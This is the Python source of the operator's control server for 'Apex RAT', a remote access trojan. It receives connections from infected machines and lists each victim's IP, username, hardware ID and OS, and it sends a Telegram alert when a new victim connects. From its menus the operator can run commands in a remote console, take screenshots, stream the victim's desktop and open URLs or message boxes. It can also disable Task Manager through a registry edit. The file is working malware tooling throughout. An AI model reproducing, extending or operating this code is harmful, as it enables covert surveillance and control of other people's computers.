# -*- coding: utf-8 -*-
import tkinter as tk
from tkinter import ttk
from tkinter import Listbox, Menu
import customtkinter as ct
import socket
import threading
from vidstream import StreamingServer
import time
from os import system as console
import os
import datetime
from PIL import Image, ImageTk #menu icons
from requests import get as rget
from subprocess import Popen, PIPE

version = "1.2"

try:
    tg_token = open("assets/telegram/token_notify.apex", "r").read()
except:pass
try:
    tg_chatid = open("assets/telegram/id_notify.apex", "r").read()
except:pass

with open("connect.apex", 'r') as file:
    host, port_str = file.read().split(":")
    port = int(port_str)
    #print(f" HOST = [{host}] PORT = [{port}]")

class StoppableHostThread(threading.Thread):
    def __init__(self):
        super().__init__()
        self.stop_flag = threading.Event()

    def run(self):
        while not self.stop_flag.is_set():
            global stream_host
            try:
                stream_host = StreamingServer(host, 4224)
                stream_host.start_server()
                break
            except OSError:
                pass
            #print('[DEBUG] Thread is running.')
            time.sleep(1)

    def stop(self):
        self.stop_flag.set()


class Developer: # ^^
    name = "Nikita"
    username = "3verlaster"
    github_link = "https://github.com/3verlaster"
    solo = True


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#server_socket.bind(('127.0.0.1', 12345))
server_socket.bind((host, port))
server_socket.listen(5)

root = tk.Tk()
root.resizable(True, False)
try:
    root.iconbitmap("assets/apex.ico")
except:
    pass
clients_number = 0
root.title(f"Apex RAT v{version} | PORT: {port_str} | developer: https://github.com/3verlaster")
root.geometry("700x360")

tg_notify_var = tk.IntVar(value=1)

bold_font = ("Helvetica", 8, "bold")

client_tree = ttk.Treeview(root, columns=("Build", "IP", "Username", "HWID", "OS"))
client_tree.pack(fill=tk.BOTH, expand=True)

# client_tree.heading("#0", text="Client Info") #comm
client_tree.heading("#1", text="Build")
client_tree.heading("#2", text="IP")
client_tree.heading("#3", text="Username")
client_tree.heading("#4", text="HWID")
client_tree.heading("#5", text="OS")

client_tree.column("#0", width=0, anchor='center')
client_tree.column("#1", width=20, anchor='center')
client_tree.column("#2", width=70, anchor='center')
client_tree.column("#3", width=50, anchor='center')
client_tree.column("#4", width=250, anchor='center')
client_tree.column("#5", width=50, anchor='center')



client_sockets = {}
client_info_map = {}  #massive for info about client

server_status_label = tk.Label(root, text="Server Status: Idle", fg="red", font=bold_font)
server_status_label.pack(side=tk.LEFT, padx=10, pady=5)

server_clients_number_label = tk.Label(root, text=f"Clients: {clients_number}", font=bold_font)
server_clients_number_label.pack(side=tk.RIGHT, padx=10, pady=5)

def github_label_callback(event): #WIN Only!
    try:
        hProcess = Popen("explorer.exe https://github.com/3verlaster/ApexRAT", stdout=PIPE, stderr=PIPE, shell=True)
    except:pass

github_label = tk.Label(root, text="[Github]", fg='#4078c0', font=bold_font) #WIN Only!
github_label.pack(side=tk.RIGHT, padx=100, pady=5) #WIN Only! 
github_label.bind("<Button-1>", github_label_callback) #WIN Only!

tg_notify_checkbox = tk.Checkbutton(root, text="Telegram Notification", variable=tg_notify_var)
tg_notify_checkbox.pack(side=tk.RIGHT, padx=5, pady=5)

def save_screenshot(screenshot_bytes):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    clients_folder = "Clients"
    if not os.path.exists(clients_folder):
        os.makedirs(clients_folder)

    curr_hwid_folder = os.path.join(clients_folder, curr_hwid)
    if not os.path.exists(curr_hwid_folder):
        os.makedirs(curr_hwid_folder)

    screenshot_filename = f"{current_time}_screenshot.png"
    screenshot_path = os.path.join(curr_hwid_folder, screenshot_filename)

    with open(screenshot_path, "wb") as screenshot_file:
        screenshot_file.write(screenshot_bytes)

def handle_client(client_socket, client_address):
    global clients_number
    data = client_socket.recv(1024).decode().split("|")
    build, username, hwid, os_version = [value.replace('ap3x', '') for value in data]
    if username == "3verlaster":
        client_data = (build, client_address[0], username, "hidden/developer", os_version) # *for developer privacy
    else:
        client_data = (build, client_address[0], username, hwid, os_version)

    client_tree.insert("", "end", values=client_data)
    client_sockets[client_socket] = {"ip": client_address[0], "port": client_address[1], "username": username, "build": build, "hwid": hwid, "os": os_version}
    clients_number += 1

    if tg_notify_var.get() == 1:
        try: #Telegram notification [New Client]
            msg_txt = f"🔵 Apex RAT: NEW Client\n\n👤 Username: {username}\n⚙️ HWID: [{hwid}]\n💻 OS: {os_version}\n🧬 Build: {build}"
            api_url = f'https://api.telegram.org/bot{tg_token}/sendMessage?chat_id={tg_chatid}&text={msg_txt}'
            rget(api_url)
        except:pass


    update_server_status()
    update_clients_number()

    while True:
        try:
            data = client_socket.recv(8192).decode() # 1024 old//*correct CMD answers
            if not data:
                break
            elif data == "ap3x_screenshot":
                screenshot_size = int(client_socket.recv(1024).decode())
                received_data = b""
                while screenshot_size > 0:
                    chunk = client_socket.recv(min(screenshot_size, 1024))
                    if not chunk:
                        break
                    received_data += chunk
                    screenshot_size -= len(chunk)
                save_screenshot(received_data)
                #print("[DEBUG] Received screenshot.")
            elif data.startswith("Ap3xCMDAnsw3r:"):
                command, answer = data.split("::")
                try:
                    output_text.insert(tk.END, f"Client: {answer}\n")
                    output_text.see(tk.END) # scroll to last line (**see)
                except Exception as e:
                    print(e)
            elif data.startswith("Ap3x1nfo:"):
                ## print(data) //
                command, c_username, c_hostname, c_os_version, c_build, c_hwid, c_public_ip, c_gpu, c_cpu  = data.split("::")
                try:
                    def info_window():
                        info_window_tk = ct.CTkToplevel(root)
                        info_window_tk.title(f"ApexRAT: Client Info - {c_hostname}@{c_username}")
                        info_window_tk.geometry("550x320")
                        try:
                            info_window_tk.iconbitmap("assets/apex.ico")
                        except:
                            pass
                        info_font = ct.CTkFont(family="Verdana", size=20)
                        ct.CTkLabel(info_window_tk, text=f"OS: {c_os_version}", font=info_font).pack(pady=2)
                        ct.CTkLabel(info_window_tk, text=f"Build: {c_build}", font=info_font).pack(pady=2)
                        ct.CTkLabel(info_window_tk, text=f"Username: {c_username}", font=info_font).pack(pady=2)
                        ct.CTkLabel(info_window_tk, text=f"Hostname: {c_hostname}", font=info_font).pack(pady=2)
                        ct.CTkLabel(info_window_tk, text=f"HWID: {c_hwid}", font=info_font).pack(pady=2)
                        ct.CTkLabel(info_window_tk, text=f"Public IP: {c_public_ip}", font=info_font).pack(pady=2)
                        ct.CTkLabel(info_window_tk, text=f"GPU: {c_gpu}", font=info_font).pack(pady=2)
                        ct.CTkLabel(info_window_tk, text=f"CPU: {c_cpu}", font=info_font).pack(pady=2)

                    info_thread = threading.Thread(target=info_window)
                    info_thread.start()
                except Exception as e:
                    print(e)
            elif data == "ap3x": #ping
                #print("[DEBUG]: ap3x")
                pass
        except:
            break

    del client_sockets[client_socket]
    clients_number -= 1
    update_client_listbox()
    update_server_status()
    update_clients_number()


def stop_host_stream():
    try:
        stream_host.stop_server()
    except:
        pass

def send_command_to_client(client_socket, command):
    client_socket.send(command.encode())

def send_hello_client(selected_client_index):
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        send_command_to_client(client_socket, "Hello, Client!")

def receive_screenshot(selected_client_index):
    global curr_hwid
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        send_command_to_client(client_socket, "ap3x_screenshot")
        curr_hwid = client_sockets[client_socket]['hwid']

def open_url(selected_client_index):
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        curr_user = client_sockets[client_socket]['username']
        curr_user_ip = client_sockets[client_socket]['ip']
        url_window = ct.CTkInputDialog(text="Type in a URL", title=f"Apex RAT | {curr_user_ip}@{curr_user} | Open URL")
        url = url_window.get_input()
        if url.startswith("http://") or url.startswith("https://"):
            send_command_to_client(client_socket, f"URLop3n_ap3x::{url}")
        else:
            pass

def send_message_box(selected_client_index):
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        curr_user = client_sockets[client_socket]['username']
        curr_user_ip = client_sockets[client_socket]['ip']
        message_box_window = ct.CTkInputDialog(text="Type in a text", title=f"Apex RAT | {curr_user_ip}@{curr_user} | MessageBox")
        box_text = message_box_window.get_input()
        #print(box_text)
        send_command_to_client(client_socket, f"Ap3x_MessageBox::{box_text}")

def disable_task_manager(selected_client_index):
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        send_command_to_client(client_socket, r'Ap3xTask_MGR::REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 1')

def enable_task_manager(selected_client_index):
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        send_command_to_client(client_socket, r'Ap3xTask_MGR::REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 0')

def client_disconnect(selected_client_index):
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        send_command_to_client(client_socket, 'Ap3xD1sconnect')

def client_remove(selected_client_index):
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        send_command_to_client(client_socket, '97f6r743dsufhduygodsut8ygdfgjou')

def cdrom_open(selected_client_index):
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        send_command_to_client(client_socket, 'ywa7t87g5t3fgkjdgh4ygerkjg')


def client_cmd(selected_client_index):
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        curr_user = client_sockets[client_socket]['username']
        curr_user_ip = client_sockets[client_socket]['ip']
        def console_window():
            global output_text
            console = tk.Toplevel(root)
            try:
                console.iconbitmap("assets/console.ico")
            except:
                pass
            #console.resizable(False, False)
            console.geometry("500x430") # width/height * 1/2
            console.title(f"ApexRAT: CMD - {curr_user_ip}@{curr_user}")

            output_text = tk.Text(console, wrap=tk.WORD)
            output_text.pack(padx=5, pady=5)
            output_text.bind("<Key>", lambda event: 'break')
            

            input_entry = tk.Entry(console, width=65)
            input_entry.pack(side=tk.LEFT, pady=5, padx=5)

            def send_command():
                command_to_send = input_entry.get()
                #output_text.insert(tk.END, f"You: {command_to_send}\n")
                input_entry.delete(0, tk.END)
                #output_text.see(tk.END) # scroll to last line (**see) ### MOVED to answer handle code-block [dev]
                send_command_to_client(client_socket, f"Ap3xCMD::{command_to_send}")

            send_button = tk.Button(console, text="Send", font='Arial 13', width=20, command=send_command)
            send_button.pack(side=tk.RIGHT, pady=2)
            console.bind("<Return>", lambda event=None: send_command())

        console_thread = threading.Thread(target=console_window)
        console_thread.start()

def client_info(selected_client_index):
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        curr_user = client_sockets[client_socket]['username']
        curr_user_ip = client_sockets[client_socket]['ip']
        send_command_to_client(client_socket, "Ap3x1nfo")



def watch_remote_desktop(selected_client_index):
    global stoppable_host_thread
    stoppable_host_thread = StoppableHostThread()
    stoppable_host_thread.start()
    time.sleep(5)
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        send_command_to_client(client_socket, "ap3x_rmt_desktop")

def client_context_menu(event):
    try:
        selected_item = client_tree.identify_row(event.y)
        selected_client_index = client_tree.index(selected_item)
        client_menu = tk.Menu(root, tearoff=0)

        #loading and creating objects "PhotoImage" for icons
        send_icon = Image.open("assets/images/context_menu/send_icon.png")
        send_icon = send_icon.resize((16, 16))  
        send_icon = ImageTk.PhotoImage(send_icon)

        client_icon = Image.open("assets/images/context_menu/client_icon.png")
        client_icon = client_icon.resize((16, 16))  
        client_icon = ImageTk.PhotoImage(client_icon)

        screenshot_icon = Image.open("assets/images/context_menu/screenshot_icon.png")
        screenshot_icon = screenshot_icon.resize((16, 16))
        screenshot_icon = ImageTk.PhotoImage(screenshot_icon)

        remote_desktop_icon = Image.open("assets/images/context_menu/remote_desktop_icon.png")
        remote_desktop_icon = remote_desktop_icon.resize((16, 16))
        remote_desktop_icon = ImageTk.PhotoImage(remote_desktop_icon)

        remote_desktop_start_icon = Image.open("assets/images/context_menu/remote_desktop_menu/remote_desktop_start_icon.png")
        remote_desktop_start_icon = remote_desktop_start_icon.resize((16, 16))
        remote_desktop_start_icon = ImageTk.PhotoImage(remote_desktop_start_icon)

        remote_desktop_stop_icon = Image.open("assets/images/context_menu/remote_desktop_menu/remote_desktop_stop_icon.png")
        remote_desktop_stop_icon = remote_desktop_stop_icon.resize((16, 16))
        remote_desktop_stop_icon = ImageTk.PhotoImage(remote_desktop_stop_icon)

        client_info_icon = Image.open("assets/images/context_menu/info_icon.png")
        client_info_icon = client_info_icon.resize((16, 16))
        client_info_icon = ImageTk.PhotoImage(client_info_icon)

        open_url_icon = Image.open("assets/images/context_menu/open_url_icon.png")
        open_url_icon = open_url_icon.resize((16, 16))
        open_url_icon = ImageTk.PhotoImage(open_url_icon)

        messagebox_icon = Image.open("assets/images/context_menu/messagebox_icon.png")
        messagebox_icon = messagebox_icon.resize((16, 16))
        messagebox_icon = ImageTk.PhotoImage(messagebox_icon)

        cdrom_open_icon = Image.open("assets/images/context_menu/cdrom_open_icon.png")
        cdrom_open_icon = cdrom_open_icon.resize((16, 16))
        cdrom_open_icon = ImageTk.PhotoImage(cdrom_open_icon)


        task_manager_icon = Image.open("assets/images/context_menu/task_manager_icon.jpg")
        task_manager_icon = task_manager_icon.resize((16, 16))
        task_manager_icon = ImageTk.PhotoImage(task_manager_icon)

        enable_task_manager_icon = Image.open("assets/images/context_menu/task_manager_menu/enable_task_manager_icon.png")
        enable_task_manager_icon = enable_task_manager_icon.resize((16, 16))
        enable_task_manager_icon = ImageTk.PhotoImage(enable_task_manager_icon)

        disable_task_manager_icon = Image.open("assets/images/context_menu/task_manager_menu/disable_task_manager_icon.png")
        disable_task_manager_icon = disable_task_manager_icon.resize((16, 16))
        disable_task_manager_icon = ImageTk.PhotoImage(disable_task_manager_icon)

        disconnect_icon = Image.open("assets/images/context_menu/client_menu/disconnect_icon.png")
        disconnect_icon = disconnect_icon.resize((16, 16))
        disconnect_icon = ImageTk.PhotoImage(disconnect_icon)

        delete_icon = Image.open("assets/images/context_menu/client_menu/delete_icon.png")
        delete_icon = delete_icon.resize((16, 16))
        delete_icon = ImageTk.PhotoImage(delete_icon)

        cmd_icon = Image.open("assets/images/context_menu/cmd_icon.png")
        cmd_icon = cmd_icon.resize((16, 16))
        cmd_icon = ImageTk.PhotoImage(cmd_icon)


        remote_desktop_menu = tk.Menu(client_menu, tearoff=0)
        remote_desktop_menu.add_command(label="Start", image=remote_desktop_start_icon, compound="left", command=lambda: watch_remote_desktop(selected_client_index))
        remote_desktop_menu.add_command(label="Stop", image=remote_desktop_stop_icon, compound="left", command=stop_host_stream)

        task_manager_menu = tk.Menu(client_menu, tearoff=0)
        task_manager_menu.add_command(label="Enable", image=enable_task_manager_icon, compound="left", command=lambda: enable_task_manager(selected_client_index))
        task_manager_menu.add_command(label="Disable", image=disable_task_manager_icon, compound="left", command=lambda: disable_task_manager(selected_client_index))

        client_management_menu = tk.Menu(client_menu, tearoff=0)
        client_management_menu.add_command(label="Disconnect", image=disconnect_icon, compound="left", command=lambda: client_disconnect(selected_client_index))
        client_management_menu.add_command(label="Delete", image=delete_icon, compound="left", command=lambda: client_remove(selected_client_index))

        client_menu.add_command(label="Send Hello", image=send_icon, compound="left", command=lambda: send_hello_client(selected_client_index))
        client_menu.add_command(label="Screenshot", image=screenshot_icon, compound="left", command=lambda: receive_screenshot(selected_client_index))
        client_menu.add_cascade(label="Remote Desktop", menu=remote_desktop_menu, image=remote_desktop_icon, compound="left")
        client_menu.add_command(label="CDRom Open", image=cdrom_open_icon, compound="left", command=lambda: cdrom_open(selected_client_index))
        client_menu.add_command(label="Open URL", image=open_url_icon, compound="left", command=lambda: open_url(selected_client_index))
        client_menu.add_command(label="Console", image=cmd_icon, compound="left", command=lambda: client_cmd(selected_client_index))
        client_menu.add_command(label="MessageBox", image=messagebox_icon, compound="left", command=lambda: send_message_box(selected_client_index))
        client_menu.add_cascade(label="Task Manager", menu=task_manager_menu, image=task_manager_icon, compound="left")
        client_menu.add_cascade(label="Client", menu=client_management_menu, image=client_icon, compound="left")
        client_menu.add_command(label="Client Info", image=client_info_icon, compound="left", command=lambda: client_info(selected_client_index))
        client_menu.post(event.x_root, event.y_root)
    except:
        pass


client_tree.bind("<Button-3>", client_context_menu)

def accept_connections():
    while True:
        client_socket, client_address = server_socket.accept()

        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_thread.start()

accept_thread = threading.Thread(target=accept_connections)
accept_thread.daemon = True
accept_thread.start()

def update_server_status():
    if len(client_sockets) > 0:
        server_status_label.config(text="Server Status: Running", fg="green")
    else:
        server_status_label.config(text="Server Status: Idle", fg="red")

def update_client_listbox():
    client_tree.delete(*client_tree.get_children())
    for client_socket, client_info in client_sockets.items():
        client_data = (
            client_info['build'],
            client_info['ip'],
            client_info['username'],
            client_info['hwid'],
            client_info['os']
        )
        client_tree.insert("", "end", values=client_data)


def update_clients_number():
    server_clients_number_label.config(text=f"Clients: {clients_number}")

root.mainloop()
